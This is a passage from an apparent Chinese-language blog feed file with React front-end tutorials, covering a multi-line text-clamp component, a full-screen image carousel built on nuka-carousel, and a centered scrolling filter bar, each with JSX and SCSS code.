function">pxToRem</span><span class="token punctuation">(</span><span class="token number">30</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> PingFangSC-Regular, PingFang SC<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">400</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">50</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.hidden-text </span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> -webkit-box<span class="token punctuation">;</span>    <span class="token property">-webkit-line-clamp</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*! autoprefixer: off */</span>    <span class="token property">-webkit-box-orient</span><span class="token punctuation">:</span> vertical<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* autoprefixer: on */</span>    <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.content-btn </span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">28</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> PingFangSC-Regular, PingFang SC<span class="token punctuation">;</span>    <span class="token property">font-weight</span><span class="token punctuation">:</span> <span class="token number">600</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">162</span>, <span class="token number">116</span>, <span class="token number">56</span>, <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">48</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">10</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引用：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> TextContainer <span class="token keyword">from</span> <span class="token string">'@/textContainer'</span><span class="token punctuation">;</span>_renderContent <span class="token operator">=</span> item <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">{</span> content<span class="token punctuation">,</span> id <span class="token punctuation">}</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>TextContainer content<span class="token operator">=</span><span class="token punctuation">{</span>content<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>效果：</p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfg0y8sligj30u01hcb2c.jpg" alt="image-20200604095922859" style="zoom:33%;">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是本人在平时开发中使用的方式，希望对大家有所帮助，如果老铁们有更好的方案可留言展示一下。</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React大图轮播</title>
      <link href="2020/06/04/React%E5%A4%A7%E5%9B%BE%E8%BD%AE%E6%92%AD/"/>
      <url>2020/06/04/React%E5%A4%A7%E5%9B%BE%E8%BD%AE%E6%92%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/lunbo.gif" alt="lunbo">  </p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>js代码：  </p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> Carousel <span class="token keyword">from</span> <span class="token string">'nuka-carousel'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'./largePreview.scss'</span><span class="token punctuation">;</span><span class="token keyword">const</span> Index <span class="token operator">=</span> props <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> props<span class="token punctuation">.</span>visible <span class="token operator">?</span> <span class="token operator">&lt;</span>LargePriview <span class="token punctuation">{</span><span class="token operator">...</span>props<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span> <span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @param {Array} pics 图片数组 [ {img: ''}, {img: ''} ] * @param {boolean} visible 是否展示大图预览 * @param {number} currentIndex 当前是第几张图片,数组下标 * @param {function} close 关闭当前图片预览 */</span><span class="token keyword">class</span> <span class="token class-name">LargePriview</span> <span class="token keyword">extends</span> <span class="token class-name">Component</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">{</span>            screenHeight<span class="token punctuation">:</span> <span class="token string">'100%'</span><span class="token punctuation">,</span>            currentIndex<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>            toggleBarHeight<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            pics<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    componentWillMount <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'cheshangtong'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                pics<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>WBCST<span class="token punctuation">.</span><span class="token function">getParamFromUrl</span><span class="token punctuation">(</span><span class="token string">'pic'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                currentIndex<span class="token punctuation">:</span> <span class="token function">Number</span><span class="token punctuation">(</span>WBCST<span class="token punctuation">.</span><span class="token function">getParamFromUrl</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                pics<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>location<span class="token punctuation">.</span>param<span class="token punctuation">.</span>pic<span class="token punctuation">,</span>                currentIndex<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>location<span class="token punctuation">.</span>param<span class="token punctuation">.</span>index            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        WBCST<span class="token punctuation">.</span><span class="token function">toggleTitlePanel</span><span class="token punctuation">(</span>            <span class="token punctuation">{</span>                hideNavBar<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                bounces<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                statusBarStyle<span class="token punctuation">:</span> <span class="token string">'light'</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    toggleBarHeight<span class="token punctuation">:</span> data<span class="token punctuation">.</span>toggleBarHeight                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> screenHeight <span class="token operator">=</span> <span class="token punctuation">(</span>document <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'100%'</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            screenHeight        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    screenHeight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> screenHeight <span class="token operator">=</span> <span class="token punctuation">(</span>document <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>clientHeight<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'100%'</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> clientWidth <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>offsetWidth<span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> toggleBarHeight <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">let</span> height <span class="token operator">=</span>            toggleBarHeight <span class="token operator">></span> <span class="token number">50</span> <span class="token operator">?</span> toggleBarHeight <span class="token punctuation">:</span> toggleBarHeight <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">45</span> <span class="token operator">/</span> <span class="token number">375</span><span class="token punctuation">)</span> <span class="token operator">*</span> clientWidth<span class="token punctuation">;</span>        <span class="token keyword">return</span> screenHeight <span class="token operator">-</span> height<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">handleImgClick</span><span class="token punctuation">(</span>show<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            currentIndex<span class="token punctuation">:</span> index        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    handleTop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> toggleBarHeight <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">let</span> clientWidth <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>offsetWidth<span class="token punctuation">;</span>        <span class="token keyword">let</span> top <span class="token operator">=</span>            toggleBarHeight <span class="token operator">></span> <span class="token number">50</span> <span class="token operator">?</span> toggleBarHeight <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">45</span> <span class="token operator">/</span> <span class="token number">375</span><span class="token punctuation">)</span> <span class="token operator">*</span> clientWidth <span class="token punctuation">:</span> toggleBarHeight<span class="token punctuation">;</span>        <span class="token keyword">return</span> top<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> screenHeight<span class="token punctuation">,</span> currentIndex<span class="token punctuation">,</span> pics <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>state<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"imgs-large-wrapper"</span><span class="token operator">></span>                <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> height<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleTop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> className<span class="token operator">=</span><span class="token string">"pre-status"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"imgs-top-float"</span><span class="token operator">></span>                    <span class="token operator">&lt;</span>div                        className<span class="token operator">=</span><span class="token string">"close"</span>                        onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'cheshangtong'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                WBCST<span class="token punctuation">.</span><span class="token function">closeCurrentPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"imgs-index-style"</span><span class="token operator">></span>                        <span class="token punctuation">{</span>currentIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token operator">/</span><span class="token punctuation">{</span>pics<span class="token punctuation">.</span>length<span class="token punctuation">}</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                    <span class="token operator">&lt;</span>div className<span class="token operator">=</span><span class="token string">"right"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                <span class="token operator">&lt;</span>div<span class="token operator">></span>                    <span class="token operator">&lt;</span>Carousel                        autoplay<span class="token operator">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span>                        slideIndex<span class="token operator">=</span><span class="token punctuation">{</span>currentIndex<span class="token punctuation">}</span>                        defaultControlsConfig<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>                            nextButtonText<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>                            prevButtonText<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>                            nextButtonStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                display<span class="token punctuation">:</span> <span class="token string">'none'</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                            prevButtonStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                                display<span class="token punctuation">:</span> <span class="token string">'none'</span>                            <span class="token punctuation">}</span><span class="token punctuation">,</span>                            pagingDotsStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span> display<span class="token punctuation">:</span> <span class="token string">'none'</span> <span class="token punctuation">}</span>                        <span class="token punctuation">}</span><span class="token punctuation">}</span>                        afterSlide<span class="token operator">=</span><span class="token punctuation">{</span>index <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">handleImgClick</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">></span>                        <span class="token punctuation">{</span>pics<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>imgItem<span class="token punctuation">,</span> imgIndex<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                            <span class="token keyword">return</span> <span class="token punctuation">(</span>                                <span class="token operator">&lt;</span>div                                    className<span class="token operator">=</span><span class="token string">"imgs-carousel-box"</span>                                    style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> height<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">screenHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>                                    key<span class="token operator">=</span><span class="token punctuation">{</span>imgIndex<span class="token punctuation">}</span><span class="token operator">></span>                                    <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token punctuation">{</span>imgItem<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span>                                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>                    <span class="token operator">&lt;</span><span class="token operator">/</span>Carousel<span class="token operator">></span>                <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> LargePriview<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>css代码：</p><pre class="line-numbers language-scss"><code class="language-scss"><span class="token property"><span class="token variable">$baseFontSize</span></span><span class="token punctuation">:</span><span class="token number">32</span>px <span class="token statement keyword">!default</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pixels to rems</span><span class="token keyword">@function</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token variable">$px</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">@return</span> <span class="token variable">$px</span> <span class="token operator">/</span> <span class="token variable">$baseFontSize</span> <span class="token operator">*</span> <span class="token number">1</span>rem<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.imgs-large-wrapper </span><span class="token punctuation">{</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#000000</span><span class="token punctuation">;</span>    <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>    <span class="token selector">.pre-status</span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#000000</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector">.imgs-top-float </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">88</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">30</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span>        <span class="token property">justify-content</span><span class="token punctuation">:</span> space-between<span class="token punctuation">;</span>        <span class="token selector">.close</span><span class="token punctuation">{</span>            <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url">url</span><span class="token punctuation">(</span><span class="token string">'./../../img/close.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>            <span class="token property">background-size</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">60</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">60</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.imgs-index-style </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">34</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> PingFang-SC-Bold,PingFang-SC<span class="token punctuation">;</span>            <span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#FFFFFF</span><span class="token punctuation">;</span>            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token selector">.right</span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token function">pxToRem</span><span class="token punctuation">(</span><span class="token number">60</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token selector">.imgs-carousel-box </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token selector">img </span><span class="token punctuation">{</span>            <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React实现头部居中滚动</title>
      <link href="2020/06/01/React%E5%AE%9E%E7%8E%B0%E5%A4%B4%E9%83%A8%E5%B1%85%E4%B8%AD%E6%BB%9A%E5%8A%A8/"/>
      <url>2020/06/01/React%E5%AE%9E%E7%8E%B0%E5%A4%B4%E9%83%A8%E5%B1%85%E4%B8%AD%E6%BB%9A%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/onowz-l4xcz.gif" alt="01-帖子列表" style="zoom:33%;">  <h2 id="DOM布局"><a href="#DOM布局" class="headerlink" title="DOM布局"></a>DOM布局</h2><pre class="line-numbers language-react"><code class="language-react">const label = {  lettersort: false,  paramname: "label",  paramid: 0,  title: "车源列表筛选项",  option: [{      value: 1,      text: "全部"    },    {      value: 2,      text: "本地求购"    },    {      value: 3,      text: "精准收车"    },    {      value: 4,      text: "全国收车"    },    {      value: 5,      text: "同行询价"    },    {      value: 6,      text: "可批可售"    },    {      value: 7,      text: "车抵贷款"    },    {      value: 8,      text: "消费贷款"    },    {      value: 9,      text: "商家库容"    },    {      value: 10,      text: "代理合作"    },    {      value: 11,      text: "过户转籍"    },    {      value: 12,      text: "寻车拖车"    },    {      value: 13,      text: "解压抵押"    },    {      value: 14,      text: "抵押核验"    }  ]}filterDom = () => {    let filterJson = label;    let arr = filterJson.option;    return (        <div ref="filterBar" className="filter-list">            {arr.map((item, index) => {                if (item.value == this.state.filterSelect) {                    return (                        <div                            ref={item.value}                            className="filter-item active"                            key={index}                            value={item.value}>                            {item.text}                            <div className="zhishi"></div>                        </div>                    );                } else {                    return (                        <div                            className="filter-item"                            onClick={() => {                                this.filterBarClick(item);                            }}                            ref={item.value}                            key={index}                            value={item.value}>                            {item.text}                        </div>                    );                }            })}        </div>    );};render(){  return(    <div>      ...      <div className="filter-content" style={{ display: this.state.filterBarShow }}>          {this.filterDom()}          <div className="shadow"></div>          {/* 按钮和占位 */}          <div              className="filte-btn-content"              onClick={() => {                  this.filterBtnClick();              }}>              <div className="filte-btn"></div>          </div>      </div>      ...    </div>  )}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>scss样式表</p><pre class="line-numbers language-scss"><code class="language-scss"><span class="token selector">.filter </span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// position: fixed;</span><span class="token 